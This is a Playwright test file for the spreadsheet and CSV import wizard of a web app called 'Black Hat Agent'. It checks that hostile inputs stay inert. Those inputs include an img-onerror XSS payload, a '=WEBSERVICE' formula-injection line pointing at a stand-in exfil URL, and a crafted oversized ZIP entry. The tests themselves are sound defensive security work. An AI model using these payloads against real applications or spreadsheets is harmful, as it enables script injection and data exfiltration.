import { test, expect } from "@playwright/test";

const APP_PATH = "../black-hat-agent/";
const STORAGE_KEY = "black_hat_agent_public_v2";

async function gotoFreshBlackHatAgent(page) {
  const response = await page.goto(APP_PATH, { waitUntil: "domcontentloaded" });
  expect(response?.status()).toBe(200);
  await page.evaluate(() => localStorage.clear());
  await page.reload({ waitUntil: "domcontentloaded" });
  await expect(page).toHaveTitle(/^Black Hat Agent$/i);
  await expect(page.getByText("BLACK HAT AGENT", { exact: true }).first()).toBeVisible();
  await expect
    .poll(() =>
      page.evaluate(() => Boolean(window.XLSX && typeof window.XLSX.read === "function"))
    )
    .toBe(true);
}

async function openImportWizard(page) {
  await page.getByRole("button", { name: "Import Excel / CSV" }).first().click();
  const wizard = page.locator("#localImportWizard");
  await expect(wizard).toBeVisible();
  return wizard;
}

async function stageCsv(page, csv, filename = "import.csv") {
  await page.locator("#tabularImportFile").setInputFiles({
    name: filename,
    mimeType: "text/csv",
    buffer: Buffer.from(csv, "utf8"),
  });
  await expect(page.locator("#importSheet")).toBeVisible();
}

async function stageXlsx(page, bytes, filename = "import.xlsx") {
  await page.locator("#tabularImportFile").setInputFiles({
    name: filename,
    mimeType: /\.xls$/i.test(filename)
      ? "application/vnd.ms-excel"
      : "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    buffer: Buffer.from(bytes),
  });
  await expect(page.locator("#importSheet")).toBeVisible();
}

function csvCell(value) {
  return `"${String(value).replaceAll('"', '""')}"`;
}

function oversizedZipEntryFixture() {
  const localHeaderSize = 30;
  const centralHeaderSize = 47;
  const endRecordSize = 22;
  const bytes = Buffer.alloc(localHeaderSize + centralHeaderSize + endRecordSize);
  bytes.writeUInt32LE(0x04034b50, 0);
  bytes.writeUInt32LE(0x02014b50, localHeaderSize);
  bytes.writeUInt16LE(8, localHeaderSize + 10);
  bytes.writeUInt32LE(1, localHeaderSize + 20);
  bytes.writeUInt32LE(20_000_001, localHeaderSize + 24);
  bytes.writeUInt16LE(1, localHeaderSize + 28);
  bytes[localHeaderSize + 46] = "x".charCodeAt(0);
  const endOffset = localHeaderSize + centralHeaderSize;
  bytes.writeUInt32LE(0x06054b50, endOffset);
  bytes.writeUInt16LE(1, endOffset + 8);
  bytes.writeUInt16LE(1, endOffset + 10);
  bytes.writeUInt32LE(centralHeaderSize, endOffset + 12);
  bytes.writeUInt32LE(localHeaderSize, endOffset + 16);
  return bytes;
}

async function storageSnapshot(page) {
  return page.evaluate(() =>
    Object.fromEntries(
      Object.keys(localStorage)
        .sort()
        .map(key => [key, localStorage.getItem(key)]),
    ),
  );
}

test("CSV criteria import previews safely, applies atomically, persists, and creates recovery", async ({
  page,
}) => {
  const pageErrors = [];
  page.on("pageerror", error => pageErrors.push(error.message));
  await gotoFreshBlackHatAgent(page);

  const beforeStorage = await storageSnapshot(page);
  const hostileName = '<img src=x onerror="window.__blackHatImportXss=1"> Strategic fit';
  const wizard = await openImportWizard(page);
  await expect(wizard.locator("#tabularImportFile")).toHaveAttribute(
    "accept",
    ".xlsx,.xls,.csv",
  );

  await stageCsv(
    page,
    [
      "Criterion,Weight,Our Score,Description",
      `"${hostileName.replaceAll('"', '""')}",25,4,"Customer-stated discriminator"`,
    ].join("\r\n"),
    "criteria.csv",
  );

  await expect(wizard.locator("#importTarget")).toHaveValue("criteria");
  await wizard.locator("#importMode").selectOption("upsert");
  await wizard.locator("#importTarget").selectOption("evidence");
  await expect(wizard.locator("#importMode")).toHaveValue("upsert");
  await wizard.locator("#importTarget").selectOption("criteria");
  await expect(wizard.locator("#importMode")).toHaveValue("upsert");
  await wizard.getByRole("button", { name: "Map columns" }).click();
  await expect(wizard.locator('select[name="map__name"]')).toHaveValue("0");
  await expect(wizard.locator('select[name="map__weight"]')).toHaveValue("1");
  await expect(wizard.locator('select[name="map__ourScore"]')).toHaveValue("2");
  await expect(wizard.locator('select[name="map__description"]')).toHaveValue("3");

  await wizard.getByRole("button", { name: "Validate and review" }).click();
  await expect(wizard.getByText("READY", { exact: true })).toBeVisible();
  await expect(wizard.locator(".preview-table").getByText(hostileName, { exact: true })).toBeVisible();
  await expect(wizard.locator(".preview-table img")).toHaveCount(0);
  expect(await page.evaluate(() => window.__blackHatImportXss)).toBeUndefined();
  expect(await storageSnapshot(page)).toEqual(beforeStorage);

  await wizard.getByRole("button", { name: "Apply import" }).click();
  await expect(page.locator("#localImportWizard")).toHaveCount(0);
  await expect(page.getByText(hostileName, { exact: true })).toBeVisible();
  await expect(page.locator(".content img")).toHaveCount(0);
  expect(await page.evaluate(() => window.__blackHatImportXss)).toBeUndefined();

  const saved = await page.evaluate(key => JSON.parse(localStorage.getItem(key)), STORAGE_KEY);
  expect(saved.criteria.some(item => item.name === hostileName)).toBe(true);
  expect(
    saved.snapshots.some(snapshot => /Before importing Evaluation criteria/i.test(snapshot.label)),
  ).toBe(true);

  await page.reload({ waitUntil: "domcontentloaded" });
  await page.getByRole("button", { name: "Evaluation Criteria" }).click();
  await expect(page.getByText(hostileName, { exact: true })).toBeVisible();
  expect(await page.evaluate(() => window.__blackHatImportXss)).toBeUndefined();
  expect(pageErrors).toEqual([]);
});

test("a non-default XLSX worksheet imports an action without an outbound request", async ({
  page,
}) => {
  const pageErrors = [];
  page.on("pageerror", error => pageErrors.push(error.message));
  await gotoFreshBlackHatAgent(page);

  const appOrigin = new URL(page.url()).origin;
  const outboundRequests = [];
  const workbookWorkers = [];
  page.on("worker", worker => workbookWorkers.push(worker.url()));
  page.on("request", request => {
    const url = new URL(request.url());
    if (/^https?:$/.test(url.protocol) && url.origin !== appOrigin) {
      outboundRequests.push(request.url());
    }
  });

  const workbookBytes = await page.evaluate(() => {
    const workbook = window.XLSX.utils.book_new();
    const criteria = window.XLSX.utils.aoa_to_sheet([
      ["Criterion", "Weight"],
      ["Default-sheet sentinel", 100],
    ]);
    const actions = window.XLSX.utils.aoa_to_sheet([
      ["Action", "Owner", "Due Date", "Status", "Priority", "Finding or gap"],
      [
        "Validate imported attack surface",
        "Capture Lead",
        "2026-08-15",
        "Open",
        "High",
        "Close the imported intelligence gap",
      ],
    ]);
    window.XLSX.utils.book_append_sheet(workbook, criteria, "Criteria");
    window.XLSX.utils.book_append_sheet(workbook, actions, "Action Queue");
    return Array.from(
      new Uint8Array(
        window.XLSX.write(workbook, {
          bookType: "xlsx",
          type: "array",
          compression: true,
        }),
      ),
    );
  });

  const wizard = await openImportWizard(page);
  const [templateDownload] = await Promise.all([
    page.waitForEvent("download"),
    wizard.getByRole("button", { name: "Download workbook template" }).click(),
  ]);
  expect(templateDownload.suggestedFilename()).toBe("black-hat-agent-import-template.xlsx");
  const templateStream = await templateDownload.createReadStream();
  const templateChunks = [];
  for await (const chunk of templateStream) templateChunks.push(Buffer.from(chunk));
  expect(Buffer.concat(templateChunks).subarray(0, 2).toString()).toBe("PK");

  await wizard.locator("#tabularImportFile").setInputFiles({
    name: "multi-sheet.xlsx",
    mimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    buffer: Buffer.from(workbookBytes),
  });
  await expect(wizard.locator("#importSheet")).toBeVisible();
  await expect(wizard.locator("#importSheet")).toHaveValue("Criteria");

  await wizard.locator("#importTarget").selectOption("actions");
  await wizard.locator("#importSheet").selectOption("Action Queue");
  await wizard.getByRole("button", { name: "Map columns" }).click();
  await expect(wizard.locator('select[name="map__title"]')).toHaveValue("0");
  await expect(wizard.locator('select[name="map__owner"]')).toHaveValue("1");
  await expect(wizard.locator('select[name="map__due"]')).toHaveValue("2");
  await expect(wizard.locator('select[name="map__status"]')).toHaveValue("3");
  await expect(wizard.locator('select[name="map__priority"]')).toHaveValue("4");
  await expect(wizard.locator('select[name="map__finding"]')).toHaveValue("5");

  await wizard.getByRole("button", { name: "Validate and review" }).click();
  await expect(wizard.getByText("READY", { exact: true })).toBeVisible();
  await expect(
    wizard.locator(".preview-table").getByText("Validate imported attack surface", {
      exact: true,
    }),
  ).toBeVisible();
  await wizard.getByRole("button", { name: "Apply import" }).click();

  await expect(page.locator("#localImportWizard")).toHaveCount(0);
  await expect(page.getByText("Validate imported attack surface", { exact: true })).toBeVisible();
  expect(
    workbookWorkers.some(url => new URL(url).pathname.endsWith("/spreadsheet-worker.js")),
  ).toBe(true);
  expect(outboundRequests).toEqual([]);
  expect(pageErrors).toEqual([]);
});

test("a legacy XLS workbook is parsed locally and imported", async ({ page }) => {
  const pageErrors = [];
  page.on("pageerror", error => pageErrors.push(error.message));
  await gotoFreshBlackHatAgent(page);

  const workbookBytes = await page.evaluate(() => {
    const workbook = window.XLSX.utils.book_new();
    window.XLSX.utils.book_append_sheet(
      workbook,
      window.XLSX.utils.aoa_to_sheet([
        ["Title", "Source"],
        ["Legacy workbook evidence", "Local XLS fixture"],
      ]),
      "Evidence",
    );
    return Array.from(
      new Uint8Array(
        window.XLSX.write(workbook, {
          bookType: "xls",
          type: "array",
        }),
      ),
    );
  });

  const wizard = await openImportWizard(page);
  await stageXlsx(page, workbookBytes, "legacy-evidence.xls");
  await wizard.locator("#importTarget").selectOption("evidence");
  await wizard.getByRole("button", { name: "Map columns" }).click();
  await expect(wizard.locator('select[name="map__title"]')).toHaveValue("0");
  await expect(wizard.locator('select[name="map__source"]')).toHaveValue("1");
  await wizard.getByRole("button", { name: "Validate and review" }).click();
  await expect(wizard.getByText("READY", { exact: true })).toBeVisible();
  await wizard.getByRole("button", { name: "Apply import" }).click();

  const saved = await page.evaluate(key => JSON.parse(localStorage.getItem(key)), STORAGE_KEY);
  expect(saved.evidence.some(item => item.title === "Legacy workbook evidence")).toBe(true);
  expect(pageErrors).toEqual([]);
});

test("an XLSX used range below row 1 honors the physical header row", async ({ page }) => {
  const pageErrors = [];
  page.on("pageerror", error => pageErrors.push(error.message));
  await gotoFreshBlackHatAgent(page);

  const workbookWorkers = [];
  page.on("worker", worker => workbookWorkers.push(worker.url()));
  const workbookBytes = await page.evaluate(() => {
    const workbook = window.XLSX.utils.book_new();
    const worksheet = window.XLSX.utils.aoa_to_sheet([]);
    window.XLSX.utils.sheet_add_aoa(
      worksheet,
      [
        ["Criterion", "Weight"],
        ["Offset header criterion", 100],
      ],
      { origin: "C5" },
    );
    window.XLSX.utils.book_append_sheet(workbook, worksheet, "Offset Headers");
    return Array.from(
      new Uint8Array(
        window.XLSX.write(workbook, {
          bookType: "xlsx",
          type: "array",
          compression: true,
        }),
      ),
    );
  });

  const wizard = await openImportWizard(page);
  await stageXlsx(page, workbookBytes, "offset-header.xlsx");
  await wizard.locator("#importHeaderRow").fill("5");
  await wizard.getByRole("button", { name: "Map columns" }).click();
  await expect(
    wizard.locator('select[name="map__name"] option:checked'),
  ).toContainText("Criterion");
  await expect(
    wizard.locator('select[name="map__weight"] option:checked'),
  ).toContainText("Weight");

  await wizard.getByRole("button", { name: "Validate and review" }).click();
  await expect(wizard.getByText("READY", { exact: true })).toBeVisible();
  const previewRow = wizard.locator(".preview-table tbody tr").first();
  await expect(previewRow.locator("td").first()).toHaveText("6");
  await expect(previewRow.getByText("Offset header criterion", { exact: true })).toBeVisible();
  await wizard.getByRole("button", { name: "Apply import" }).click();

  const saved = await page.evaluate(key => JSON.parse(localStorage.getItem(key)), STORAGE_KEY);
  expect(saved.criteria.some(item => item.name === "Offset header criterion")).toBe(true);
  expect(
    workbookWorkers.some(url => new URL(url).pathname.endsWith("/spreadsheet-worker.js")),
  ).toBe(true);
  expect(pageErrors).toEqual([]);
});

test("hidden XLSX worksheets are unavailable for selection", async ({ page }) => {
  const pageErrors = [];
  page.on("pageerror", error => pageErrors.push(error.message));
  await gotoFreshBlackHatAgent(page);

  const workbookBytes = await page.evaluate(() => {
    const workbook = window.XLSX.utils.book_new();
    window.XLSX.utils.book_append_sheet(
      workbook,
      window.XLSX.utils.aoa_to_sheet([
        ["Criterion", "Weight"],
        ["Visible criterion", 100],
      ]),
      "Visible",
    );
    window.XLSX.utils.book_append_sheet(
      workbook,
      window.XLSX.utils.aoa_to_sheet([
        ["Criterion", "Weight"],
        ["Hidden criterion", 100],
      ]),
      "Hidden Data",
    );
    workbook.Workbook = {
      ...(workbook.Workbook || {}),
      Sheets: [{ Hidden: 0 }, { Hidden: 1 }],
    };
    return Array.from(
      new Uint8Array(
        window.XLSX.write(workbook, {
          bookType: "xlsx",
          type: "array",
          compression: true,
        }),
      ),
    );
  });

  const wizard = await openImportWizard(page);
  await stageXlsx(page, workbookBytes, "hidden-sheet.xlsx");
  await expect(wizard.locator("#importSheet")).toHaveValue("Visible");
  const hiddenOption = wizard.locator('#importSheet option[value="Hidden Data"]');
  await expect(hiddenOption).toHaveCount(1);
  await expect(hiddenOption).toBeDisabled();
  expect(pageErrors).toEqual([]);
});

test("an XLSX ZIP entry over the expanded-size limit is rejected before parsing", async ({
  page,
}) => {
  const pageErrors = [];
  page.on("pageerror", error => pageErrors.push(error.message));
  await gotoFreshBlackHatAgent(page);

  const wizard = await openImportWizard(page);
  await wizard.locator("#tabularImportFile").setInputFiles({
    name: "oversized-expanded-entry.xlsx",
    mimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    buffer: oversizedZipEntryFixture(),
  });
  await expect(wizard.locator(".wizard-status")).toContainText(
    /entry exceeds the 20 MB expanded-size limit/i,
  );
  await expect(wizard.locator("#importSheet")).toHaveCount(0);
  expect(pageErrors).toEqual([]);
});

for (const hiddenDimension of ["row", "column"]) {
  test(`a visible XLSX worksheet with a hidden ${hiddenDimension} is rejected`, async ({
    page,
  }) => {
    const pageErrors = [];
    page.on("pageerror", error => pageErrors.push(error.message));
    await gotoFreshBlackHatAgent(page);

    const workbookBytes = await page.evaluate(dimension => {
      const workbook = window.XLSX.utils.book_new();
      const worksheet = window.XLSX.utils.aoa_to_sheet([
        ["Criterion", "Weight"],
        ["Concealed source criterion", 100],
      ]);
      if (dimension === "row") worksheet["!rows"] = [{}, { hidden: true }];
      if (dimension === "column") worksheet["!cols"] = [{ hidden: true }, {}];
      window.XLSX.utils.book_append_sheet(workbook, worksheet, "Visible Data");
      return Array.from(
        new Uint8Array(
          window.XLSX.write(workbook, {
            bookType: "xlsx",
            type: "array",
            compression: true,
          }),
        ),
      );
    }, hiddenDimension);

    const wizard = await openImportWizard(page);
    await stageXlsx(page, workbookBytes, `hidden-${hiddenDimension}.xlsx`);
    await wizard.getByRole("button", { name: "Map columns" }).click();
    await expect(wizard.locator(".wizard-status")).toContainText(
      new RegExp(`hidden ${hiddenDimension}`, "i"),
    );
    await expect(wizard.locator('form[data-wizard-form="mapping"]')).toHaveCount(0);
    expect(pageErrors).toEqual([]);
  });
}

test("CSV formula-like prefixes remain inert text through preview and persistence", async ({
  page,
}) => {
  const pageErrors = [];
  page.on("pageerror", error => pageErrors.push(error.message));
  await gotoFreshBlackHatAgent(page);

  const appOrigin = new URL(page.url()).origin;
  const outboundRequests = [];
  page.on("request", request => {
    const url = new URL(request.url());
    if (/^https?:$/.test(url.protocol) && url.origin !== appOrigin) {
      outboundRequests.push(request.url());
    }
  });
  const formulaLikeTitles = [
    '=WEBSERVICE("https://example.invalid/exfil")',
    "+SUM(1,1)",
    "-1+2",
    "@SUM(1,1)",
  ];
  const csv = [
    "Action,Owner,Finding or gap",
    ...formulaLikeTitles.map(value =>
      [csvCell(value), "Security reviewer", csvCell("Formula-like input remains text")].join(","),
    ),
  ].join("\r\n");

  const wizard = await openImportWizard(page);
  await stageCsv(page, csv, "formula-prefixes.csv");
  await wizard.locator("#importTarget").selectOption("actions");
  await wizard.getByRole("button", { name: "Map columns" }).click();
  await wizard.getByRole("button", { name: "Validate and review" }).click();
  await expect(wizard.getByText("READY", { exact: true })).toBeVisible();
  for (const title of formulaLikeTitles) {
    await expect(
      wizard.locator(".preview-table").getByText(title, { exact: true }),
    ).toBeVisible();
  }

  await wizard.getByRole("button", { name: "Apply import" }).click();
  const savedTitles = await page.evaluate(key => {
    const workspace = JSON.parse(localStorage.getItem(key));
    return workspace.actions
      .filter(item => item.pursuitId === workspace.active)
      .map(item => item.title);
  }, STORAGE_KEY);
  expect(savedTitles).toEqual(expect.arrayContaining(formulaLikeTitles));
  expect(outboundRequests).toEqual([]);
  expect(pageErrors).toEqual([]);
});

test("replace mode requires explicit scoped-replacement confirmation before Apply", async ({
  page,
}) => {
  const pageErrors = [];
  page.on("pageerror", error => pageErrors.push(error.message));
  await gotoFreshBlackHatAgent(page);

  const wizard = await openImportWizard(page);
  await stageCsv(
    page,
    ["Criterion,Weight", "Replacement criterion,100"].join("\n"),
    "replacement.csv",
  );
  await wizard.locator("#importMode").selectOption("replace");
  await wizard.getByRole("button", { name: "Map columns" }).click();
  await wizard.getByRole("button", { name: "Validate and review" }).click();

  const confirmation = wizard.locator('input[name="confirmReplace"]');
  await expect(confirmation).toBeVisible();
  await expect(confirmation).not.toBeChecked();
  await expect(wizard.getByRole("button", { name: "Apply import" })).toBeDisabled();

  await confirmation.check();
  await expect(wizard.locator('input[name="confirmReplace"]')).toBeChecked();
  await expect(wizard.getByRole("button", { name: "Apply import" })).toBeEnabled();
  await wizard.getByRole("button", { name: "Apply import" }).click();
  await expect(page.locator("#localImportWizard")).toHaveCount(0);

  const criteria = await page.evaluate(key => {
    const workspace = JSON.parse(localStorage.getItem(key));
    return {
      active: workspace.criteria
        .filter(item => item.pursuitId === workspace.active)
        .map(item => item.name),
      retainedOtherPursuit: workspace.criteria.some(item => item.id === "cr6"),
    };
  }, STORAGE_KEY);
  expect(criteria.active).toEqual(["Replacement criterion"]);
  expect(criteria.retainedOtherPursuit).toBe(true);
  expect(pageErrors).toEqual([]);
});
